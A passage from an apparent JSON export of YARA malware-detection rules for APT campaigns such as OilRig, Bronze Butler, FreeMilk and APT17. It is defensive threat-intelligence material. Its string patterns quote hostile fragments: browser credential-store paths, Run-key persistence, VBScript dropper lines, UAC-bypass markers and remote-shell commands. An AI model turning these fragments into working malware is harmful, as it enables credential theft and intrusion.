$s4 = \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"a.a\\\"\" fullword ascii\n      $s5 = \"Agent configured successfully\" fullword ascii\n      $s6 = \"\\\\runlog*\" fullword ascii\n      $s7 = \"can not specify username!!\" fullword ascii\n      $s8 = \"Agent can not be configured\" fullword ascii\n      $s9 = \"%08lX%04hX%04hX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX\" fullword ascii\n      $s10 = \"!!! can not create output file !!!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"538805ecd776b9a42e71aebf94fde1b1\" or pe.imphash ( ) == \"861ac226fbe8c99a2c43ff451e95da97\" or ( 1 of ( $x* ) or 3 of them ) )\n}","date":"2017-10-18 14:48:31","description":"Detects OilRig malware from Unit 42 report in October 2017","minimum_yara":"1.7","name":"OilRig_ISMAgent_Campaign_Samples3_RID3374","reference":"https://goo.gl/JQVfFP","required_modules":["pe"],"rule_hash":"50424b217ff47bf5c8aeedbf608dae7d","score":75,"tags":["DEMO","T1053","FILE","MIDDLE_EAST","APT","EXE"]},{"author":"Florian Roth","content":"rule BronzeButler_Daserf_Delphi_1_RID31E8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 13:42:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Services.exe\" fullword ascii\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\" fullword ascii\n      $s3 = \"l32.dll\" fullword ascii\n      $s4 = \"tProcess:\" fullword ascii\n      $s5 = \" InjectPr\" ascii\n      $s6 = \"Write$Error creating variant or safe array\u001fInvalid argument to time encode\" fullword wide\n      $s7 = \"on\\\\run /v \" fullword ascii\n      $s8 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run\" fullword ascii\n      $s9 = \"ms1ng2d3d2.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}","date":"2017-10-14 13:42:31","description":"Detects malware / hacktool sample from Bronze Butler incident","minimum_yara":"1.7","name":"BronzeButler_Daserf_Delphi_1_RID31E8","reference":"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses","required_modules":[],"rule_hash":"ddadd4533f93cd48f77be59c93460e4a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BronzeButler_Daserf_C_1_RID2FD5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 12:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(c) 2010 DYAMAR EnGineerinG, All rights reserved, http://www.dyamar.com.\" fullword ascii\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)\" fullword ascii\n      $a1 = \"ndkkwqgcm\" fullword ascii\n      $a2 = \"RtlGetCo\" fullword ascii\n      $a3 = \"hutils\" fullword ascii\n      $b1 = \"%USERPROFILE%\\\\System\" fullword ascii\n      $b2 = \"msid.dat\" fullword ascii\n      $b3 = \"DRIVE_REMOTE\" fullword wide\n      $b4 = \"%s%s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n      $b5 = \"jcbhe.asp\" fullword ascii\n      $b6 = \"edset.asp\" fullword ascii\n      $b7 = \"bxcve.asp\" fullword ascii\n      $b8 = \"hcvery.php\" fullword ascii\n      $b9 = \"ynhkef.php\" fullword ascii\n      $b10 = \"dkgwey.php\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"088382f4887e3b2c4bd5157f2d72b618\" or all of ( $a* ) or 4 of them )\n}","date":"2017-10-14 12:14:01","description":"Detects malware / hacktool sample from Bronze Butler incident","minimum_yara":"1.7","name":"BronzeButler_Daserf_C_1_RID2FD5","reference":"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses","required_modules":["pe"],"rule_hash":"cd3f100b48000b1e7276424860810dfa","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BronzeButler_DGet_1_RID2E42 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 11:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"DGet Tool Made by XZ\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )\n}","date":"2017-10-14 11:06:51","description":"Detects malware / hacktool sample from Bronze Butler incident","minimum_yara":"1.7","name":"BronzeButler_DGet_1_RID2E42","reference":"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses","required_modules":[],"rule_hash":"3b5549ec6b153894c021a310df7d2058","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BronzeButler_UACBypass_1_RID3029 : APT DEMO EXE FILE T1088 {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 12:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1088\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\BypassUacDll.pdb\" ascii\n      $x2 = \"%programfiles%internet exploreriexplore.exe\" fullword wide\n      $x3 = \"Elevation:Administrator!new:{3ad055\" fullword wide\n      $x4 = \"BypassUac.pdb\" fullword ascii\n      $x5 = \"[bypassUAC] started X64\" fullword wide\n      $x6 = \"[bypassUAC] started X86\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them )\n}","date":"2017-10-14 12:28:01","description":"Detects malware / hacktool sample from Bronze Butler incident","minimum_yara":"1.7","name":"BronzeButler_UACBypass_1_RID3029","reference":"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses","required_modules":[],"rule_hash":"aca0e50e1464769ea69977f38db697cf","score":75,"tags":["APT","DEMO","EXE","T1088","FILE"]},{"author":"Florian Roth","content":"rule BronzeButler_xxmm_1_RID2EA8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 11:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\ReflectivLoader.pdb\" ascii\n      $x3 = \"\\\\Projects\\\\xxmm2\\\\Release\\\\\" ascii\n      $x5 = \"http://127.0.0.1/phptunnel.php\" fullword ascii\n      $s1 = \"xxmm2.exe\" fullword ascii\n      $s2 = \"\\\\AvUpdate.exe\" fullword wide\n      $s3 = \"stdapi_fs_file_download\" fullword ascii\n      $s4 = \"stdapi_syncshell_open\" fullword ascii\n      $s5 = \"stdapi_execute_sleep\" fullword ascii\n      $s6 = \"stdapi_syncshell_kill\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2017-10-14 11:23:51","description":"Detects malware / hacktool sample from Bronze Butler incident","minimum_yara":"1.7","name":"BronzeButler_xxmm_1_RID2EA8","reference":"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses","required_modules":[],"rule_hash":"b7cc810e10efbb03e74bb37cf07f105b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BronzeButler_RarStar_1_RID2F9D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware / hacktool sample from Bronze Butler incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses\"\n      date = \"2017-10-14 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+6.0;+SV1)\" fullword wide\n      $s2 = \"http://www.google.co.jp\" fullword wide\n      $s3 = \"16D73E22-873D-D58E-4F42-E6055BC9825E\" fullword ascii\n      $s4 = \"\\\\*.rar\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-10-14 12:04:41","description":"Detects malware / hacktool sample from Bronze Butler incident","minimum_yara":"1.7","name":"BronzeButler_RarStar_1_RID2F9D","reference":"https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses","required_modules":[],"rule_hash":"8ed981eff7e57049b08b35413d0e283c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Saudi_Phish_Trojan_RID2E2F : DEMO EXE FILE MAL T1193 T1203 {\n   meta:\n      description = \"Detects a trojan used in Saudi Aramco Phishing\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Z3JUAA\"\n      date = \"2017-10-12 11:03:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 7B 00 30 00 7D 00 7B 00 31 00 7D 00 5C 00 00 09\n               2E 00 64 00 6C 00 6C 00 00 11 77 00 33 00 77 00\n               70 00 2E 00 65 00 78 00 65 00 00 1B 61 00 73 00\n               70 00 6E 00 65 00 74 00 5F 00 77 00 70 00 2E 00\n               65 00 78 00 65 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )\n}","date":"2017-10-12 11:03:41","description":"Detects a trojan used in Saudi Aramco Phishing","minimum_yara":"1.7","name":"Saudi_Phish_Trojan_RID2E2F","reference":"https://goo.gl/Z3JUAA","required_modules":[],"rule_hash":"4401ceb9763de9044acecbc30ae86bcb","score":75,"tags":["T1203","T1193","MAL","DEMO","FILE","EXE"]},{"author":"Florian Roth","content":"rule BKDR_Snarasite_Oct17_RID2E2A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Semiautomatic generated rule - file 36ba92cba23971ca9d16a0b4f45c853fd5b3108076464d5f2027b0f56054fd62\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-10-07 11:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"322bef04e1e1ac48875036e38fb5c23c\" or pe.imphash ( ) == \"15088754757513c92fa36ba5590e907b\" )\n}","date":"2017-10-07 11:02:51","description":"Semiautomatic generated rule - file 36ba92cba23971ca9d16a0b4f45c853fd5b3108076464d5f2027b0f56054fd62","minimum_yara":"1.7","name":"BKDR_Snarasite_Oct17_RID2E2A","reference":"Internal Research","required_modules":["pe"],"rule_hash":"b66f9a61f42f8e2ed7eb9ea2f2f7d1c0","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FreeMilk_APT_Mal_1_RID2D6D : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\milk\\\\Release\\\\milk.pdb\" ascii\n      $x2 = \"E:\\\\BIG_POOH\\\\Project\\\\\" ascii\n      $x3 = \"Windows-KB271854-x86.exe\" fullword wide\n      $s1 = \"Windows-KB275122-x86.exe\" fullword wide\n      $s2 = \"\\\\wsatra.tmp\" fullword wide\n      $s3 = \"%s\\\\Rar0tmpExtra%d.rtf\" fullword wide\n      $s4 = \"\\\"%s\\\" help\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"108aa007b3d1b4817ff4c04d9b254b39\" or 1 of ( $x* ) or 4 of them )\n}","date":"2017-10-05 10:31:21","description":"Detects malware from FreeMilk campaign","minimum_yara":"1.7","name":"FreeMilk_APT_Mal_1_RID2D6D","reference":"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/","required_modules":["pe"],"rule_hash":"889dcb4b543b828246e5933b999e018a","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FreeMilk_APT_Mal_2_RID2D6E : APT DEMO EXE FILE MAL T1113 {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1113\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"failed to take the screenshot. err: %d\" fullword ascii\n      $s2 = \"runsample\" fullword wide\n      $s3 = \"%s%02X%02X%02X%02X%02X%02X:\" fullword wide\n      $s4 = \"win-%d.%d.%d-%d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"b86f7d2c1c182ec4c074ae1e16b7a3f5\" or all of them )\n}","date":"2017-10-05 10:31:31","description":"Detects malware from FreeMilk campaign","minimum_yara":"1.7","name":"FreeMilk_APT_Mal_2_RID2D6E","reference":"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/","required_modules":["pe"],"rule_hash":"45c28a8cf16054aaf514da341c88696c","score":75,"tags":["T1113","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule FreeMilk_APT_Mal_3_RID2D6F : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CMD.EXE /C \\\"%s\\\"\" fullword wide\n      $s2 = \"\\\\command\\\\start.exe\" fullword wide\n      $s3 = \".bat;.com;.cmd;.exe\" fullword wide\n      $s4 = \"Unexpected failure opening HKCR key: %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them )\n}","date":"2017-10-05 10:31:41","description":"Detects malware from FreeMilk campaign","minimum_yara":"1.7","name":"FreeMilk_APT_Mal_3_RID2D6F","reference":"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/","required_modules":[],"rule_hash":"53f7a7601986ac603194075dd344f586","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FreeMilk_APT_Mal_4_RID2D70 : APT DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects malware from FreeMilk campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n      date = \"2017-10-05 10:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1085\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"base64Encoded=\\\"TVqQAAMAAAAE\" ascii\n      $s1 = \"SOFTWARE\\\\Clients\\\\StartMenuInternet\\\\firefox.exe\\\\shell\\\\open\\\\command\" fullword wide\n      $s2 = \"'Wscript.echo \\\"Base64 encoded: \\\" + base64Encoded\" fullword ascii\n      $s3 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $s4 = \"outFile=sysDir&\\\"\\\\rundll32.exe\\\"\" fullword ascii\n      $s5 = \"set shell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n      $s6 = \"command =outFile &\\\" sysupdate\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( ( pe.exports ( \"getUpdate\" ) and pe.number_of_exports == 1 ) or 1 of ( $x* ) or 3 of them )\n}","date":"2017-10-05 10:31:51","description":"Detects malware from FreeMilk campaign","minimum_yara":"1.7","name":"FreeMilk_APT_Mal_4_RID2D70","reference":"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/","required_modules":["pe"],"rule_hash":"54a7157ba9c861178abd74bc8a8916e6","score":75,"tags":["MAL","DEMO","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule URL_File_Local_EXE_RID2D6E : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Detects an .url file that points to a local executable\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malwareforme/status/915300883012870144\"\n      date = \"2017-10-04 10:31:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[InternetShortcut]\" ascii wide fullword\n      $s2 = /URL=file:\\/\\/\\/C:\\\\[^\\n]{1,50}\\.exe/ \n   condition: \n      filesize < 400 and all of them\n}","date":"2017-10-04 10:31:31","description":"Detects an .url file that points to a local executable","minimum_yara":"1.7","name":"URL_File_Local_EXE_RID2D6E","reference":"https://twitter.com/malwareforme/status/915300883012870144","required_modules":[],"rule_hash":"cc10db7c91677347a4eb04993e6b33dc","score":60,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule CMStar_Malware_Sep17_RID2E52 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CMStar Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/pTffPA\"\n      date = \"2017-10-03 11:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UpdateService.tmp\" fullword ascii\n      $s2 = \"StateNum:%d,FileSize:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"22021985de78a48ea8fb82a2ff9eb693\" or pe.exports ( \"WinCred\" ) or all of them )\n}","date":"2017-10-03 11:09:31","description":"Detects CMStar Malware","minimum_yara":"1.7","name":"CMStar_Malware_Sep17_RID2E52","reference":"https://goo.gl/pTffPA","required_modules":["pe"],"rule_hash":"dae69b504e654dae8f4fcef08685d695","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT17_Malware_Oct17_1_RID2E03 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/puVc9q\"\n      date = \"2017-10-03 10:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\spool\\\\prtprocs\\\\w32x86\\\\localspl.dll\" fullword ascii\n      $s2 = \"\\\\spool\\\\prtprocs\\\\x64\\\\localspl.dll\" fullword ascii\n      $s3 = \"\\\\msvcrt.dll\" fullword ascii\n      $s4 = \"\\\\TSMSISrv.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}","date":"2017-10-03 10:56:21","description":"Detects APT17 malware","minimum_yara":"1.7","name":"APT17_Malware_Oct17_1_RID2E03","reference":"https://goo.gl/puVc9q","required_modules":[],"rule_hash":"08b41a3e2a062f8d9acd219263b7f035","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT17_Malware_Oct17_2_RID2E04 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/puVc9q\"\n      date = \"2017-10-03 10:56:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Cookie: __xsptplus=%s\" fullword ascii\n      $x2 = \"http://services.fiveemotions.co.jp\" fullword ascii\n      $x3 = \"http://%s/ja-JP/2015/%d/%d/%d%d%d%d%d%d%d%d.gif\" fullword ascii\n      $s1 = \"FoxHTTPClient_EXE_x86.exe\" fullword ascii\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3072\" ascii\n      $s3 = \"hWritePipe2 Error:%d\" fullword ascii\n      $s4 = \"Not Support This Function!\" fullword ascii\n      $s5 = \"Global\\\\PnP_No_Management\" fullword ascii\n      $s6 = \"Content-Type: image/x-png\" fullword ascii\n      $s7 = \"Accept-Language: ja-JP\" fullword ascii\n      $s8 = \"IISCMD Error:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.exports ( \"_foo@0\" ) or 1 of ( $x* ) or 6 of them )\n}","date":"2017-10-03 10:56:31","description":"Detects APT17 malware","minimum_yara":"1.7","name":"APT17_Malware_Oct17_2_RID2E04","reference":"https://goo.gl/puVc9q","required_modules":["pe"],"rule_hash":"88c86ccb80f6a61690facd025dd17946","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT17_Unsigned_Symantec_Binary_EFA_RID338C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/puVc9q\"\n      date = \"2017-10-03 14:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Copyright (c) 2007 - 2011 Symantec Corporation\" fullword wide\n      $s2 = \"\\\\\\\\.\\\\SYMEFA\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them and pe.number_of_signatures == 0 )\n}","date":"2017-10-03 14:52:31","description":"Detects APT17 malware","minimum_yara":"1.7","name":"APT17_Unsigned_Symantec_Binary_EFA_RID338C","reference":"https://goo.gl/puVc9q","required_modules":["pe"],"rule_hash":"01ab888843f68b2902c7f5a69c1abe33","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT17_Malware_Oct17_Gen_RID2EEC : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects APT17 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/puVc9q\"\n      date = \"2017-10-03 11:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)\" fullword ascii\n      $x2 = \"http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM\" ascii\n      $s1 = \"hWritePipe2 Error:%d\" fullword ascii\n      $s2 = \"Not Support This Function!\" fullword ascii\n      $s3 = \"Cookie: SESSIONID=%s\" fullword ascii\n      $s4 = \"http://0.0.0.0/1\" fullword ascii\n      $s5 = \"Content-Type: image/x-png\" fullword ascii\n      $s6 = \"Accept-Language: en-US\" fullword ascii\n      $s7 = \"IISCMD Error:%d\" fullword ascii\n      $s8 = \"[IISEND=0x%08X][Recv:] 0x%08X %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"414bbd566b700ea021cfae3ad8f4d9b9\" or 1 of ( $x* ) or 6 of them ) )\n}","date":"2017-10-03 11:35:11","description":"Detects APT17 malware","minimum_yara":"1.7","name":"APT17_Malware_Oct17_Gen_RID2EEC","reference":"https://goo.gl/puVc9q","required_modules":["pe"],"rule_hash":"fe6b57c0e6c98d344bb2842615a68161","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule redSails_EXE_RID2B89 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Red Sails Hacktool by WinDivert references\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/BeetleChunks/redsails\"\n      date = \"2017-10-02 09:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bWinDivert64.dll\" fullword ascii\n      $s2 = \"bWinDivert32.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them )\n}","date":"2017-10-02 09:10:41","description":"Detects Red Sails Hacktool by WinDivert references","minimum_yara":"1.7","name":"redSails_EXE_RID2B89","reference":"https://github.com/BeetleChunks/redsails","required_modules":[],"rule_hash":"da9633674219be99df24384fa40bab11","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule redSails_PY_RID2B50 : DEMO HKTL SCRIPT {\n   meta:\n      description = \"Detects Red Sails Hacktool - Python\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/BeetleChunks/redsails\"\n      date = \"2017-10-02 09:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Gained command shell on host\" fullword ascii\n      $x2 = \"[!] Received an ERROR in shell()\" fullword ascii\n      $x3 = \"Target IP address with backdoor installed\" fullword ascii\n      $x4 = \"Open backdoor port on target machine\" fullword ascii\n      $x5 = \"Backdoor port to open on victim machine\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-10-02 09:01:11","description":"Detects Red Sails Hacktool - Python","minimum_yara":"1.7","name":"redSails_PY_RID2B50","reference":"https://github.com/BeetleChunks/redsails","required_modules":[],"rule_hash":"ba2ac36ab55b1fd16f004ba9f391cf25","score":75,"tags":["DEMO","SCRIPT","HKTL"]},{"author":"Florian Roth","content":"rule Susp_PowerShell_Sep17_1_RID2F9F : DEMO SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects suspicious PowerShell script in combo with VBS or JS \"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-30 12:05:01\"\n      score = 60\n      customer = \"demo\"\n      license = 